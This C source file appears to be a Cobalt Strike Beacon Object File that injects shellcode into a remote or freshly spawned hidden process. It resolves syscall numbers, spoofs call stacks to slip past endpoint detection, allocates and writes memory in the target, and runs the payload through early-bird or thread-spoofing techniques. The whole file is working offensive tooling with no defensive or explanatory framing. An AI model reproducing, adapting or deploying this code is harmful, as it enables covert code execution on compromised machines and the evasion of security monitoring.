#include <windows.h>

#include "Prototypes.h"
#include "Beacon.h"
#include "Vulcan.h"
#include "Ntdll.h"
#include "Macros.h"
#include "Bofdefs.h"
#include "Syscalls.h"

void go(char *args, int len, BOOL x86) 
{
   	datap               parser;
   	int                 pid = 0;
   	int                 offset = 0;
   	char *              dllPtr = NULL;
   	int                 dllLen = 0;

#ifdef INJECT_EXPLICIT
 /* Extract the arguments */
   	BeaconDataParse(&parser, args, len);
   	pid = BeaconDataInt(&parser);
   	offset = BeaconDataInt(&parser);
   	dllPtr = BeaconDataExtract(&parser, &dllLen);

#elif defined(INJECT_SPAWN)
    STARTUPINFOA        si;
    PROCESS_INFORMATION pi;
    short               ignoreToken;

	/* Extract the arguments */
    BeaconDataParse(&parser, args, len);
    ignoreToken = BeaconDataShort(&parser);
    dllPtr = BeaconDataExtract(&parser, &dllLen);

    /* zero out these data structures */
    __stosb((void *)&si, 0, sizeof(STARTUPINFO));
    __stosb((void *)&pi, 0, sizeof(PROCESS_INFORMATION));
    
	/* setup the other values in our startup info structure */
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.cb = sizeof(STARTUPINFO);
    
#endif

	SYNTHETIC_STACK_FRAME   stackFrame = { 0 };
	NT_FUNC					ntFunc		= { 0 };

	if (!InitNtFunc(&ntFunc))
	{
		BeaconPrintf(CALLBACK_ERROR, "[!] Fail to solve SSN !\n");
		return;
	}

	if (!InitFrameInfo(&stackFrame))
	{
		BeaconPrintf(CALLBACK_ERROR,"[!] Fail to init stack frame !\n");
		return;
	}

	CLIENT_ID cId = { 0 };
	cId.UniqueProcess = (HANDLE)pid;

	OBJECT_ATTRIBUTES oa = { 0 };
	InitializeObjectAttributes(&oa, 0, 0, 0, 0);

	NTSTATUS status = 0;
	HANDLE hProcess, hThread = NULL;
	
		/* --------------------------------
			Obtain HANDLE in process
		-------------------------------- */

#ifdef INJECT_SPAWN
 	/* Ready to go: spawn, inject and cleanup */
    if (!BeaconSpawnTemporaryProcess(FALSE, ignoreToken, &si, &pi)) {
        BeaconPrintf(CALLBACK_ERROR, "Unable to spawn %s temporary process.", x86 ? "x86" : "x64");
        return;
    }
	else
	{
		BeaconPrintf(CALLBACK_OUTPUT, "Subprocess spawn with success !\n\tPID : %d\n\tTID : %d\n\thProcess : %p\n", pi.dwProcessId, pi.dwThreadId, pi.hProcess );
	}

    //BeaconPrintf(CALLBACK_OUTPUT, "Subprocess spawn with success !");
    hProcess 	= pi.hProcess;
	hThread		= pi.hThread;


#else
	status = SPOOF_CALL(&stackFrame, ntFunc.NtOpenProcess.pJmpAddr, ntFunc.NtOpenProcess.wSyscall, &hProcess, PROCESS_ALL_ACCESS, &oa, &cId);
	if(NT_ERROR(status))
	{
		BeaconPrintf(CALLBACK_ERROR, "[Main Error] 0x1 | NTSTATUS : 0x%llx", status);
		goto cleanup;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "Remote hProcess HANDLE : 0x%llx", hProcess);
	
	#endif
	PVOID  pAllocatedAddr = NULL;
	SIZE_T allocSize = dllLen;

	// Failsafe, sometimes went wrong
	for(int i = 0; i < 5; i++)
	{
		status = SPOOF_CALL(&stackFrame, ntFunc.NtAllocateVirtualMemory.pJmpAddr, ntFunc.NtAllocateVirtualMemory.wSyscall, hProcess, &pAllocatedAddr, 0, &allocSize,  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if(NT_SUCCESS(status))
		{
			break;
		}
		else
		{
			if(status != 0xC00000BB) // STATUS_NOT_SUPPORTED sometimes went wront with this NT_STATUS
			{
				BeaconPrintf(CALLBACK_ERROR, "[Main Error] 0x2 | NTSTATUS : 0x%llx", status);
				goto cleanup;
			}
		
		}

	}


	/* --------------------------------
		Write Shellcode
	-------------------------------- */

	SIZE_T writtenBytes = 0;
	status = SPOOF_CALL(&stackFrame, ntFunc.NtWriteVirtualMemory.pJmpAddr, ntFunc.NtWriteVirtualMemory.wSyscall, hProcess, pAllocatedAddr, dllPtr, dllLen, &writtenBytes);
	if(NT_ERROR(status))
	{
		BeaconPrintf(CALLBACK_ERROR, "[Main Error] 0x3 | NTSTATUS :  0x%llx", status);
		goto cleanup;
	}

		/* --------------------------------
			Shellcode Injection
		-------------------------------- */

#ifdef INJECT_SPAWN

#ifdef EARLYBIRD

	if(!EarlyBird(pi.hThread, pi.hProcess, pAllocatedAddr, dllLen, offset, &stackFrame, &ntFunc))
	{
		BeaconPrintf(CALLBACK_ERROR, "Early bird fail !");
		//goto cleanup;
	}
#elif defined(THREADSPOOF)
	BeaconPrintf(CALLBACK_OUTPUT, "Execute shellcode with thread spoof !");

	if(!ThreadSpoof(pi.hThread, pi.hProcess, pAllocatedAddr, dllLen, offset, &stackFrame, &ntFunc))
	{
		BeaconPrintf(CALLBACK_ERROR, "Thread spoof fail !");
		//goto cleanup;
	}

#endif

	
#else	

	BeaconPrintf(CALLBACK_OUTPUT, "Remote hProcess HANDLE : 0x%llx", hProcess);

	UINT_PTR uiStartAddr = GetProcAddress(GetModuleHandleA("Ntdll.dll"), "RtlCreateUserThread");
	uiStartAddr += 0x21;

 	status = SPOOF_CALL(&stackFrame, ntFunc.NtCreateThreadEx.pJmpAddr, ntFunc.NtCreateThreadEx.wSyscall, &hThread, NT_CREATE_THREAD_EX_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)uiStartAddr, NULL, NT_CREATE_THREAD_EX_SUSPENDED, NULL, NULL, NULL, NULL);
	if(NT_ERROR(status))
	{
		BeaconPrintf(CALLBACK_ERROR, "[Main Error] 0x4 | NTSTATUS :  0x%llx", status);

		goto cleanup;
	}

#ifdef THREADSPOOF

	if (!ThreadSpoof(hThread, hProcess, pAllocatedAddr, dllLen, offset, &stackFrame, &ntFunc))
	{
		BeaconPrintf(CALLBACK_ERROR, "Thread spoof fail !");
		goto cleanup;
	}
#elif defined(EARLYBIRD)
	BeaconPrintf(CALLBACK_OUTPUT, "Execute shellcode with early bird !");

	if(!EarlyBird(hThread, hProcess, pAllocatedAddr, dllLen, offset, &stackFrame, &ntFunc))
	{
		BeaconPrintf(CALLBACK_ERROR, "Early bird fail !");
		goto cleanup;
	}

#endif

#endif
	BeaconPrintf(CALLBACK_OUTPUT, "Injection success !");

cleanup:
	if(hProcess != NULL)
		SPOOF_CALL(&stackFrame, ntFunc.NtClose.pJmpAddr, ntFunc.NtClose.wSyscall, hProcess, 0);

	if(hThread != NULL)
		SPOOF_CALL(&stackFrame, ntFunc.NtClose.pJmpAddr, ntFunc.NtClose.wSyscall, hThread, 0);

	return;
}